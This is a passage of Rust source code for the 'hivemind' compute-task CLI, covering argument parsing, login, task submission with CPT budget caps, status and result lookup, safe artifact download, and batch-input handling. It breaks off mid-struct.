use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::time::{Duration, Instant};

#[path = "cli_artifacts.rs"]
mod artifacts;
#[path = "cli_check.rs"]
mod check;
#[path = "cli_pipeline.rs"]
mod pipeline;

pub use check::{run_check, CheckCommand};
pub use pipeline::{run_check as run_pipeline_check, PipelineCommand};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CliCommand {
    Service(String),
    Submit(SubmitCommand),
    Status(TaskLookupCommand),
    Result(TaskLookupCommand),
    Batch(BatchCommand),
    Check(CheckCommand),
    Pipeline(PipelineCommand),
}

/// One function run over many inputs. Inputs come one JSON value per line of `inputs_path`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct BatchCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub source_path: String,
    pub inputs_path: String,
    pub out_path: Option<String>,
    pub max_total_cpt: i64,
    pub max_cpt_per_task: Option<i64>,
    pub task_prefix: Option<String>,
    pub per_minute: u32,
    pub poll_secs: u64,
    pub timeout_secs: u64,
    pub cpu_score: Option<i32>,
    pub memory_gb: Option<i32>,
    pub gpu_score: Option<i32>,
    pub gpu_memory_gb: Option<i32>,
    pub storage_gb: Option<i64>,
    pub host_count: Option<i32>,
    /// Replicas to request. The network default applies when this is `None`.
    pub replicas: Option<u16>,
    /// Run every input locally first, so failures are found and each task gets its exact cap.
    pub precheck: bool,
    /// Submit the inputs that pass the pre-check instead of stopping when any fails.
    pub skip_invalid: bool,
    /// Continue the batch that `--task-prefix` and `--out` name, submitting only what is missing.
    pub resume: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SubmitCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub source_path: String,
    pub input: String,
    pub artifacts: Vec<(String, String)>,
    pub task_id: String,
    pub cpu_score: Option<i32>,
    pub memory_gb: Option<i32>,
    pub gpu_score: Option<i32>,
    pub gpu_memory_gb: Option<i32>,
    pub storage_gb: Option<i64>,
    pub host_count: Option<i32>,
    pub max_cpt: Option<i64>,
    /// `--max-cpt auto`: price the task from a local run instead of a number.
    pub max_cpt_auto: bool,
    /// Replicas to request. The network default applies when this is `None`.
    pub replicas: Option<u16>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskLookupCommand {
    pub api_base: String,
    pub username: String,
    pub password: String,
    pub task_id: String,
    pub download: bool,
    pub artifact_key: Option<String>,
}

pub fn parse_cli_args(args: &[String]) -> Result<CliCommand> {
    let command = args.get(1).map(String::as_str).unwrap_or("all");
    if command == "status" || command == "result" {
        let lookup = parse_task_lookup_args(args, command)?;
        return Ok(if command == "status" {
            CliCommand::Status(lookup)
        } else {
            CliCommand::Result(lookup)
        });
    }

    if command == "batch" {
        return Ok(CliCommand::Batch(parse_batch_args(args)?));
    }

    if command == "check" {
        return Ok(CliCommand::Check(check::parse_check_args(args)?));
    }

    if command == "pipeline" {
        return Ok(CliCommand::Pipeline(pipeline::parse_pipeline_args(args)?));
    }

    if command != "submit" {
        return Ok(CliCommand::Service(command.to_string()));
    }

    let source_path = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind submit <function-source> --username <user> --password <pass> [--input <json>] [--artifact <name=path.safetensors>] [--task-id <id>] [--max-cpt <cpt|auto>] [--replicas <2-7>]"
            )
        })?
        .clone();

    let mut submit = SubmitCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        task_id: derive_task_id(&source_path)?,
        source_path,
        input: String::new(),
        artifacts: Vec::new(),
        cpu_score: None,
        memory_gb: None,
        gpu_score: None,
        gpu_memory_gb: None,
        storage_gb: None,
        host_count: None,
        max_cpt: None,
        max_cpt_auto: false,
        replicas: None,
    };

    let mut i = 3;
    while i < args.len() {
        let flag = args[i].as_str();
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag {
            "--api" => submit.api_base = normalize_api_base(value),
            "--username" => submit.username = value.clone(),
            "--password" => submit.password = value.clone(),
            "--task-id" => submit.task_id = parse_task_id_flag(value)?,
            "--input" => submit.input = value.clone(),
            "--artifact" => submit.artifacts.push(artifacts::parse_spec(value)?),
            "--cpu-score" => submit.cpu_score = Some(parse_i32_flag(flag, value)?),
            "--memory-gb" => submit.memory_gb = Some(parse_i32_flag(flag, value)?),
            "--gpu-score" => submit.gpu_score = Some(parse_i32_flag(flag, value)?),
            "--gpu-memory-gb" => submit.gpu_memory_gb = Some(parse_i32_flag(flag, value)?),
            "--storage-gb" => submit.storage_gb = Some(parse_i64_flag(flag, value)?),
            "--host-count" => submit.host_count = Some(parse_i32_flag(flag, value)?),
            "--max-cpt" if value == "auto" => {
                submit.max_cpt = None;
                submit.max_cpt_auto = true;
            }
            "--max-cpt" => {
                submit.max_cpt = Some(parse_i64_flag(flag, value)?);
                submit.max_cpt_auto = false;
            }
            "--replicas" => submit.replicas = Some(check::parse_replicas(flag, value)?),
            _ => return Err(anyhow!("unknown submit flag {}", flag)),
        }
        i += 2;
    }
    Ok(CliCommand::Submit(submit))
}

fn parse_task_lookup_args(args: &[String], command: &str) -> Result<TaskLookupCommand> {
    let task_id = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind {} <task-id> --username <user> --password <pass>",
                command
            )
        })?
        .clone();
    if !is_safe_task_id(&task_id) {
        return Err(anyhow!(
            "task id must be non-empty ASCII alphanumeric, '.', '-', or '_'"
        ));
    }

    let mut lookup = TaskLookupCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        task_id,
        download: false,
        artifact_key: None,
    };
    let mut i = 3;
    while i < args.len() {
        let flag = args[i].to_string();
        if flag == "--download" {
            lookup.download = true;
            i += 1;
            continue;
        }
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag.as_str() {
            "--api" => lookup.api_base = normalize_api_base(value),
            "--username" => lookup.username = value.clone(),
            "--password" => lookup.password = value.clone(),
            "--artifact-key" => lookup.artifact_key = Some(value.trim().to_string()),
            _ => return Err(anyhow!("unknown {} flag {}", command, flag)),
        }
        i += 2;
    }
    if lookup.username.trim().is_empty() {
        return Err(anyhow!("--username is required"));
    }
    if lookup.password.is_empty() {
        lookup.password = password_from_env().unwrap_or_default();
    }
    if lookup.password.is_empty() {
        return Err(anyhow!("--password is required"));
    }
    Ok(lookup)
}

fn normalize_api_base(value: &str) -> String {
    value.trim().trim_end_matches('/').to_string()
}

fn default_api_base() -> String {
    std::env::var("HIVEMIND_API_BASE")
        .ok()
        .map(|value| normalize_api_base(&value))
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| "http://localhost:8082".into())
}

// Lets scripts keep the password out of the command line, where other local processes can read it.
fn password_from_env() -> Option<String> {
    std::env::var("HIVEMIND_PASSWORD")
        .ok()
        .filter(|value| !value.is_empty())
}

fn parse_i32_flag(flag: &str, value: &str) -> Result<i32> {
    value
        .parse::<i32>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_i64_flag(flag: &str, value: &str) -> Result<i64> {
    value
        .parse::<i64>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_task_id_flag(value: &str) -> Result<String> {
    if is_safe_task_id(value) {
        Ok(value.to_string())
    } else {
        Err(anyhow!(
            "task id must be non-empty ASCII alphanumeric, '.', '-', or '_'"
        ))
    }
}

fn derive_task_id(source_path: &str) -> Result<String> {
    let stem = Path::new(source_path)
        .file_stem()
        .and_then(|value| value.to_str())
        .ok_or_else(|| anyhow!("could not derive task id from source path"))?
        .to_string();
    if is_safe_task_id(&stem) {
        Ok(stem)
    } else {
        Err(anyhow!("derived task id is not safe; pass --task-id"))
    }
}

fn is_safe_task_id(task_id: &str) -> bool {
    if task_id.len() == 1 && task_id.as_bytes()[0] == b'.' {
        return false;
    }
    !task_id.trim().is_empty()
        && task_id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
        && !task_id.contains("..")
}

#[derive(Debug, Deserialize)]
struct LoginResponse {
    success: bool,
    message: Option<String>,
    token: Option<String>,
}

#[derive(Debug, Deserialize)]
struct TaskResponse {
    success: bool,
    message: Option<String>,
    task: Option<TaskInfo>,
}

#[derive(Debug, Deserialize)]
struct TaskInfo {
    task_id: String,
    status: String,
}

#[derive(Debug, Serialize)]
struct LoginRequest<'a> {
    username: &'a str,
    password: &'a str,
}

async fn login(
    client: &reqwest::Client,
    api_base: &str,
    username: &str,
    password: &str,
) -> Result<String> {
    let login_url = format!("{}/api/login", api_base);
    let login = client
        .post(&login_url)
        .json(&LoginRequest { username, password })
        .send()
        .await
        .map_err(|e| anyhow!("login request failed: {}", e))?;
    let login_status = login.status();
    let login_response: LoginResponse = login
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode login response: {}", e))?;
    if !login_status.is_success() || !login_response.success {
        return Err(anyhow!(
            "login failed: {}",
            login_response
                .message
                .unwrap_or_else(|| login_status.to_string())
        ));
    }
    let token = login_response
        .token
        .ok_or_else(|| anyhow!("login response did not include a token"))?;
    Ok(token)
}

/// Runs the function once on this machine and returns the task budget its usage needs.
async fn local_task_budget(
    submit: &SubmitCommand,
    task_source: &str,
) -> Result<general_compute_runtime::managed_budget::TaskBudget> {
    if submit.input.trim().is_empty() {
        return Err(anyhow!(
            "--max-cpt auto needs --input: the local run has to see the data the task will run on"
        ));
    }
    let artifacts = check::load_artifacts(&submit.artifacts)?;
    let replicas = submit.replicas.unwrap_or(check::DEFAULT_REPLICAS);
    let limits = check::default_limits();
    let (source, input) = (task_source.to_owned(), submit.input.clone());
    let outcome = tokio::task::spawn_blocking(move || {
        check::run_local(&source, &input, artifacts.as_ref(), limits)
    })
    .await
    .map_err(|e| anyhow!("the local run stopped unexpectedly: {}", e))?;
    match outcome {
        Ok(report) => check::budget_for(&report, replicas),
        Err(failure) => Err(anyhow!(
            "the function failed in a local run, so nothing was submitted: {}",
            check::describe_failure(&failure, limits)
        )),
    }
}

/// A quote prices the reserved resources only, but the checks it shares with task creation
/// still need an input and a positive budget, so it carries a placeholder of 1 CPT.
fn submit_quote_body(
    submit: &SubmitCommand,
    source: &str,
) -> serde_json::Map<String, serde_json::Value> {
    let mut body = serde_json::Map::new();
    body.insert("runtime".into(), "hcode".into());
    body.insert("task_source".into(), source.into());
    body.insert("torrent".into(), submit.input.clone().into());
    if let Some(v) = submit.cpu_score {
        body.insert("cpu_score".into(), v.into());
    }
    if let Some(v) = submit.memory_gb {
        body.insert("memory_gb".into(), v.into());
    }
    if let Some(v) = submit.gpu_score {
        body.insert("gpu_score".into(), v.into());
    }
    if let Some(v) = submit.gpu_memory_gb {
        body.insert("gpu_memory_gb".into(), v.into());
    }
    if let Some(v) = submit.storage_gb {
        body.insert("storage_gb".into(), v.into());
    }
    if let Some(v) = submit.host_count {
        body.insert("host_count".into(), v.into());
    }
    body.insert("max_cpt".into(), 1.into());
    body
}

pub async fn run_submit(submit: SubmitCommand) -> Result<()> {
    let task_source = tokio::fs::read_to_string(&submit.source_path)
        .await
        .map_err(|e| anyhow!("failed to read {}: {}", submit.source_path, e))?;
    if task_source.trim().is_empty() {
        return Err(anyhow!("{} is empty", submit.source_path));
    }
    // `--max-cpt auto` prices the task from a run on this machine. A function that fails
    // there is stopped before anything is sent.
    let local_budget = if submit.max_cpt_auto {
        Some(local_task_budget(&submit, &task_source).await?)
    } else {
        None
    };
    let prepared = artifacts::PreparedArtifacts::prepare(&submit.input, &submit.artifacts).await?;

    let client = reqwest::Client::new();
    let token = login(
        &client,
        &submit.api_base,
        &submit.username,
        &submit.password,
    )
    .await?;

    let mut max_cpt = submit.max_cpt;
    if let Some(budget) = &local_budget {
        // The Master refuses a cap below the resource price, so the cap is whichever is larger.
        let resource_price = post_quote(
            &client,
            &submit.api_base,
            &token,
            &submit_quote_body(&submit, &task_source),
        )
        .await?;
        let cap = budget.task_budget.max(resource_price);
        println!(
            "Using --max-cpt {cap}: {} replicas x {} units, plus a {} CPT platform fee (estimated from a local run)",
            budget.replica_count, budget.replica_usage, budget.fee
        );
        max_cpt = Some(cap);
    }

    // hcode tasks carry their JSON input in the `torrent` field;
    // Nodepool stores it verbatim as the task input reference.
    let input = if let Some(prepared) = &prepared {
        Some(prepared.input_json.clone())
    } else if submit.input.trim().is_empty() {
        None
    } else {
        Some(submit.input.clone())
    };
    let mut body = serde_json::json!({
        "task_id": submit.task_id,
        "runtime": "hcode",
        "task_source": task_source,
    });
    if let Some(input) = input {
        body["torrent"] = serde_json::Value::String(input);
    }
    if let Some(v) = submit.cpu_score {
        body["cpu_score"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.memory_gb {
        body["memory_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.gpu_score {
        body["gpu_score"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.gpu_memory_gb {
        body["gpu_memory_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.storage_gb {
        body["storage_gb"] = serde_json::Value::from(v);
    }
    if let Some(v) = submit.host_count {
        body["host_count"] = serde_json::Value::from(v);
    }
    if let Some(v) = max_cpt {
        body["max_cpt"] = serde_json::Value::from(v);
    }
    if let Some(replicas) = submit.replicas {
        // A policy needs both numbers: a replica count with the default quorum can be invalid.
        body["managed_replica_count"] = serde_json::Value::from(replicas);
        body["managed_quorum"] = serde_json::Value::from(check::majority(replicas));
    }

    let create_url = format!("{}/api/tasks", submit.api_base);
    let created = client
        .post(&create_url)
        .bearer_auth(&token)
        .json(&body)
        .send()
        .await
        .map_err(|e| anyhow!("task create request failed: {}", e))?;
    let create_status = created.status();
    let task_response: TaskResponse = created
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task create response: {}", e))?;
    if !create_status.is_success() || !task_response.success {
        return Err(anyhow!(
            "task create failed: {}",
            task_response
                .message
                .unwrap_or_else(|| create_status.to_string())
        ));
    }

    if let Some(prepared) = prepared {
        prepared
            .upload(&client, &submit.api_base, &token, &submit.task_id)
            .await?;
    }
    if let Some(task) = task_response.task {
        println!("Submitted task {} ({})", task.task_id, task.status);
    } else {
        println!("Submitted task {}", submit.task_id);
    }
    Ok(())
}

pub async fn run_status(command: TaskLookupCommand) -> Result<()> {
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = format!("{}/api/tasks", command.api_base);
    let response = client
        .get(&url)
        .query(&[("task_ids", &command.task_id)])
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task status request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task status response: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!(
            "task status failed: {}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let task = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .and_then(|tasks| {
            tasks.iter().find(|task| {
                task.get("task_id")
                    .and_then(|value| value.as_str())
                    .is_some_and(|id| id == command.task_id)
            })
        })
        .ok_or_else(|| anyhow!("task {} not found", command.task_id))?;
    let task_status = serde_json::json!({
        "success": true,
        "task_id": task.get("task_id").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status": task.get("status").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status_message": task.get("status_message").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "output": task.get("output").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "wall_time_ms": task.get("wall_time_ms").cloned().unwrap_or(serde_json::Value::from(0)),
        "peak_memory_mb": task.get("peak_memory_mb").cloned().unwrap_or(serde_json::Value::from(0)),
    });
    println!("{}", format_task_status(&task_status)?);
    Ok(())
}

pub async fn run_result(command: TaskLookupCommand) -> Result<()> {
    if command.download {
        return download_task_artifact(&command).await;
    }
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = format!("{}/api/tasks", command.api_base);
    let response = client
        .get(&url)
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("task result request failed: {}", e))?;
    let status = response.status();
    let body: serde_json::Value = response
        .json()
        .await
        .map_err(|e| anyhow!("failed to decode task result response: {}", e))?;
    if !status.is_success() {
        return Err(anyhow!(
            "task result failed: {}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let task = body
        .get("tasks")
        .and_then(|value| value.as_array())
        .and_then(|tasks| {
            tasks.iter().find(|task| {
                task.get("task_id")
                    .and_then(|value| value.as_str())
                    .is_some_and(|id| id == command.task_id)
            })
        })
        .ok_or_else(|| anyhow!("task {} not found", command.task_id))?;
    let task_result = serde_json::json!({
        "success": true,
        "task_id": task.get("task_id").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status": task.get("status").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "result_torrent": task.get("result_torrent").cloned().unwrap_or(serde_json::Value::String(String::new())),
        "status_message": task.get("status_message").cloned().unwrap_or(serde_json::Value::String(String::new())),
        // Managed tasks keep their printed output here instead of in a result torrent.
        "output": task.get("output").cloned().unwrap_or(serde_json::Value::String(String::new())),
    });
    println!("{}", format_task_result(&task_result)?);
    Ok(())
}

async fn download_task_artifact(command: &TaskLookupCommand) -> Result<()> {
    use std::io::Write;
    let client = reqwest::Client::new();
    let token = login(
        &client,
        &command.api_base,
        &command.username,
        &command.password,
    )
    .await?;
    let url = artifact_download_url(command);
    let response = client
        .get(&url)
        .bearer_auth(token)
        .send()
        .await
        .map_err(|e| anyhow!("artifact download request failed: {}", e))?;
    let status = response.status();
    let headers = response.headers().clone();
    if !status.is_success() {
        let body: serde_json::Value = response.json().await.unwrap_or_default();
        return Err(anyhow!(
            "artifact download failed: {}",
            body.get("message")
                .and_then(|v| v.as_str())
                .unwrap_or_else(|| status.as_str())
        ));
    }
    let filename = artifact_filename_from_content_disposition(
        headers
            .get("content-disposition")
            .and_then(|v| v.to_str().ok()),
    )?;
    let bytes = response
        .bytes()
        .await
        .map_err(|e| anyhow!("download read failed: {}", e))?;
    let mut file = std::fs::File::create(&filename)
        .map_err(|e| anyhow!("cannot create {}: {}", filename, e))?;
    file.write_all(&bytes)
        .map_err(|e| anyhow!("cannot write {}: {}", filename, e))?;
    println!("Downloaded {} ({} bytes)", filename, bytes.len());
    Ok(())
}

fn artifact_filename_from_content_disposition(header: Option<&str>) -> Result<String> {
    let Some(header) = header else {
        return Ok("artifact.bin".to_string());
    };
    let Some(raw_filename) = content_disposition_parameter(header, "filename") else {
        return Ok("artifact.bin".to_string());
    };
    let filename = raw_filename
        .strip_prefix('"')
        .and_then(|value| value.strip_suffix('"'))
        .unwrap_or(raw_filename)
        .trim();
    if is_safe_artifact_filename(filename) {
        Ok(filename.to_string())
    } else {
        Err(anyhow!("unsafe artifact download filename"))
    }
}

fn content_disposition_parameter<'a>(header: &'a str, parameter_name: &str) -> Option<&'a str> {
    let mut start = 0;
    let mut in_quote = false;
    for (idx, ch) in header.char_indices() {
        match ch {
            '"' => in_quote = !in_quote,
            ';' if !in_quote => {
                if let Some(value) =
                    matching_content_disposition_parameter(&header[start..idx], parameter_name)
                {
                    return Some(value);
                }
                start = idx + ch.len_utf8();
            }
            _ => {}
        }
    }
    matching_content_disposition_parameter(&header[start..], parameter_name)
}

fn matching_content_disposition_parameter<'a>(
    part: &'a str,
    parameter_name: &str,
) -> Option<&'a str> {
    let (name, value) = part.trim().split_once('=')?;
    name.trim()
        .eq_ignore_ascii_case(parameter_name)
        .then_some(value.trim())
}

fn is_safe_artifact_filename(filename: &str) -> bool {
    if filename.is_empty() || matches!(filename, "." | "..") {
        return false;
    }
    if filename.chars().any(|c| {
        c.is_control() || matches!(c, '/' | '\\' | ':' | '<' | '>' | '"' | '|' | '?' | '*')
    }) {
        return false;
    }
    let stem = filename.split('.').next().unwrap_or(filename);
    !matches!(
        stem.to_ascii_uppercase().as_str(),
        "CON"
            | "PRN"
            | "AUX"
            | "NUL"
            | "COM1"
            | "COM2"
            | "COM3"
            | "COM4"
            | "COM5"
            | "COM6"
            | "COM7"
            | "COM8"
            | "COM9"
            | "LPT1"
            | "LPT2"
            | "LPT3"
            | "LPT4"
            | "LPT5"
            | "LPT6"
            | "LPT7"
            | "LPT8"
            | "LPT9"
    )
}

fn artifact_download_url(command: &TaskLookupCommand) -> String {
    let mut url = format!(
        "{}/api/tasks/{}/artifact/download",
        command.api_base, command.task_id
    );
    if let Some(artifact_key) = command.artifact_key.as_deref() {
        if !artifact_key.trim().is_empty() {
            url.push_str("?artifact_key=");
            url.push_str(&url_encode_query_value(artifact_key));
        }
    }
    url
}

fn url_encode_query_value(value: &str) -> String {
    let mut encoded = String::new();
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() || matches!(byte, b'-' | b'_' | b'.' | b'~') {
            encoded.push(byte as char);
        } else {
            encoded.push_str(&format!("%{byte:02X}"));
        }
    }
    encoded
}

pub fn format_task_status(body: &serde_json::Value) -> Result<String> {
    if body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!(
            "{}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or("task status response was not successful")
        ));
    }
    let task_id = body
        .get("task_id")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let status = body
        .get("status")
        .and_then(|value| value.as_str())
        .unwrap_or("UNKNOWN");
    let message = body
        .get("status_message")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let output = body
        .get("output")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let wall_time_ms = body
        .get("wall_time_ms")
        .and_then(|value| value.as_i64())
        .unwrap_or(0);
    let peak_memory_mb = body
        .get("peak_memory_mb")
        .and_then(|value| value.as_i64())
        .unwrap_or(0);

    Ok(format!(
        "Task: {}\nStatus: {}\nMessage: {}\nOutput: {}\nWall time ms: {}\nPeak memory MB: {}",
        task_id, status, message, output, wall_time_ms, peak_memory_mb
    ))
}

pub fn format_task_result(body: &serde_json::Value) -> Result<String> {
    if body.get("success").and_then(|value| value.as_bool()) != Some(true) {
        return Err(anyhow!(
            "{}",
            body.get("message")
                .and_then(|value| value.as_str())
                .unwrap_or("task result response was not successful")
        ));
    }
    let task_id = body
        .get("task_id")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let status = body
        .get("status")
        .and_then(|value| value.as_str())
        .unwrap_or("UNKNOWN");
    let result_torrent = body
        .get("result_torrent")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let message = body
        .get("status_message")
        .and_then(|value| value.as_str())
        .unwrap_or("");
    let output = body
        .get("output")
        .and_then(|value| value.as_str())
        .unwrap_or("");

    let mut text = format!(
        "Task: {}\nStatus: {}\nResult torrent: {}\nMessage: {}",
        task_id, status, result_torrent, message
    );
    if !output.is_empty() {
        text.push_str("\nOutput: ");
        text.push_str(output);
    }
    Ok(text)
}

/// The most inputs one batch may hold. Each input is its own task with its own budget.
const MAX_BATCH_INPUTS: usize = 1000;
/// The default budget for one batch task. A quote prices only the reserved resources, not the execution, so a
/// task capped at its quote runs out of budget almost at once.
const DEFAULT_BATCH_TASK_CPT: i64 = 100;
const BATCH_RESULT_HEADER: &str = "index,task_id,status,output,billed_cpt,message,input";
/// The status of an input that the local pre-check refused to submit. The message says why.
const PRECHECK_FAILED: &str = "PRECHECK_FAILED";

fn parse_batch_args(args: &[String]) -> Result<BatchCommand> {
    let source_path = args
        .get(2)
        .ok_or_else(|| {
            anyhow!(
                "Usage: hivemind batch <function-source> --inputs <inputs.jsonl> --max-total-cpt <cpt> --username <user> [--password <pass>] [--out <results.csv>] [--max-cpt-per-task <cpt>] [--replicas <2-7>] [--no-precheck] [--skip-invalid] [--task-prefix <prefix>] [--resume] [--per-minute <1-60>] [--poll-secs <n>] [--timeout-secs <n>] [--api <url>]"
            )
        })?
        .clone();

    let mut batch = BatchCommand {
        api_base: default_api_base(),
        username: String::new(),
        password: String::new(),
        source_path,
        inputs_path: String::new(),
        out_path: None,
        max_total_cpt: 0,
        max_cpt_per_task: None,
        task_prefix: None,
        per_minute: 50,
        poll_secs: 5,
        timeout_secs: 3600,
        cpu_score: None,
        memory_gb: None,
        gpu_score: None,
        gpu_memory_gb: None,
        storage_gb: None,
        host_count: None,
        replicas: None,
        precheck: true,
        skip_invalid: false,
        resume: false,
    };
    let mut max_total_cpt = None;

    let mut i = 3;
    while i < args.len() {
        let flag = args[i].as_str();
        // These two take no value.
        match flag {
            "--no-precheck" => {
                batch.precheck = false;
                i += 1;
                continue;
            }
            "--skip-invalid" => {
                batch.skip_invalid = true;
                i += 1;
                continue;
            }
            "--resume" => {
                batch.resume = true;
                i += 1;
                continue;
            }
            _ => {}
        }
        let value = args
            .get(i + 1)
            .ok_or_else(|| anyhow!("missing value for {}", flag))?;
        match flag {
            "--api" => batch.api_base = normalize_api_base(value),
            "--username" => batch.username = value.clone(),
            "--password" => batch.password = value.clone(),
            "--inputs" => batch.inputs_path = value.clone(),
            "--out" => batch.out_path = Some(value.clone()),
            "--max-total-cpt" => max_total_cpt = Some(parse_i64_flag(flag, value)?),
            "--max-cpt-per-task" => batch.max_cpt_per_task = Some(parse_i64_flag(flag, value)?),
            "--task-prefix" => batch.task_prefix = Some(value.clone()),
            "--per-minute" => batch.per_minute = parse_u32_flag(flag, value)?,
            "--poll-secs" => batch.poll_secs = parse_u64_flag(flag, value)?,
            "--timeout-secs" => batch.timeout_secs = parse_u64_flag(flag, value)?,
            "--cpu-score" => batch.cpu_score = Some(parse_i32_flag(flag, value)?),
            "--memory-gb" => batch.memory_gb = Some(parse_i32_flag(flag, value)?),
            "--gpu-score" => batch.gpu_score = Some(parse_i32_flag(flag, value)?),
            "--gpu-memory-gb" => batch.gpu_memory_gb = Some(parse_i32_flag(flag, value)?),
            "--storage-gb" => batch.storage_gb = Some(parse_i64_flag(flag, value)?),
            "--host-count" => batch.host_count = Some(parse_i32_flag(flag, value)?),
            "--replicas" => batch.replicas = Some(check::parse_replicas(flag, value)?),
            _ => return Err(anyhow!("unknown batch flag {}", flag)),
        }
        i += 2;
    }
    if batch.skip_invalid && !batch.precheck {
        return Err(anyhow!(
            "--skip-invalid needs the local pre-check, which --no-precheck turns off"
        ));
    }
    if batch.resume && batch.task_prefix.is_none() {
        return Err(anyhow!(
            "--resume needs --task-prefix: it names the batch to continue"
        ));
    }

    if batch.username.trim().is_empty() {
        return Err(anyhow!("--username is required"));
    }
    if batch.password.is_empty() {
        batch.password = password_from_env().unwrap_or_default();
    }
    if batch.password.is_empty() {
        return Err(anyhow!("--password is required (or set HIVEMIND_PASSWORD)"));
    }
    if batch.inputs_path.trim().is_empty() {
        return Err(anyhow!(
            "--inputs <file> is required: one JSON input per line"
        ));
    }
    batch.max_total_cpt = max_total_cpt.ok_or_else(|| {
        anyhow!("--max-total-cpt is required: a batch does not run without a total budget")
    })?;
    if batch.max_total_cpt <= 0 {
        return Err(anyhow!("--max-total-cpt must be greater than 0"));
    }
    if batch.max_cpt_per_task.is_some_and(|cap| cap <= 0) {
        return Err(anyhow!("--max-cpt-per-task must be greater than 0"));
    }
    if !(1..=60).contains(&batch.per_minute) {
        return Err(anyhow!("--per-minute must be between 1 and 60"));
    }
    if !(1..=3600).contains(&batch.poll_secs) {
        return Err(anyhow!("--poll-secs must be between 1 and 3600"));
    }
    if !(10..=86_400).contains(&batch.timeout_secs) {
        return Err(anyhow!("--timeout-secs must be between 10 and 86400"));
    }
    if let Some(prefix) = batch.task_prefix.as_deref() {
        if !is_safe_task_id(&format!("{prefix}-0001")) {
            return Err(anyhow!(
                "--task-prefix may use only letters, digits, '.', '-', '_'"
            ));
        }
    }
    Ok(batch)
}

fn parse_u32_flag(flag: &str, value: &str) -> Result<u32> {
    value
        .parse::<u32>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

fn parse_u64_flag(flag: &str, value: &str) -> Result<u64> {
    value
        .parse::<u64>()
        .map_err(|e| anyhow!("invalid {}: {}", flag, e))
}

/// Reads one JSON value per non-empty line. Each value is kept in compact form, as the task input field takes it.
pub fn parse_batch_inputs(text: &str) -> Result<Vec<String>> {
    let mut inputs = Vec::new();
    for (line_index, line) in text.lines().enumerate() {
        let line = line.trim();
        if line.is_empty() {
            continue;
        }
        let value: serde_json::Value = serde_json::from_str(line).map_err(|error| {
            anyhow!(
                "line {} of the inputs file is not valid JSON: {}",
                line_index + 1,
                error
            )
        })?;
        if inputs.len() == MAX_BATCH_INPUTS {
            return Err(anyhow!("a batch holds at most {} inputs", MAX_BATCH_INPUTS));
        }
        inputs.push(value.to_string());
    }
    if inputs.is_empty() {
        return Err(anyhow!("the inputs file has no JSON lines"));
    }
    Ok(inputs)
}

fn batch_task_id(prefix: &str, index: usize) -> String {
    format!("{prefix}-{:04}", index + 1)
}

fn batch_worst_case_cpt(caps: &[i64]) -> Result<i64> {
    caps.iter()
        .try_fold(0_i64, |sum, cap| sum.checked_add(*cap))
        .ok_or_else(|| anyhow!("the batch's worst-case cost is out of range"))
}

const BATCH_STATE_VERSION: u32 = 1;

/// What a batch remembers so `--resume` can pick it up again. It records the function, every
/// input, the settings, and the cap each task was given, so a resume cannot attach the task ids
/// of one batch to different data or to a different price.
#[derive(Debug, Serialize, Deserialize, PartialEq, Eq)]
struct BatchState {
    version: u32,
    prefix: String,
    source_sha256: String,
    settings: BatchSettings,
    rows: Vec<BatchStateRow>,
}

/// The settings that change what a task asks for, or which inputs the batch sends. The caps
/// themselves are saved per row, so a resume uses the saved plan and refuses any flag that would
/// have produced a different one.
#[derive(Debug, Serialize, Deserialize, PartialEq, Eq)]
struct BatchSettings {
    replicas: Option<u16>,
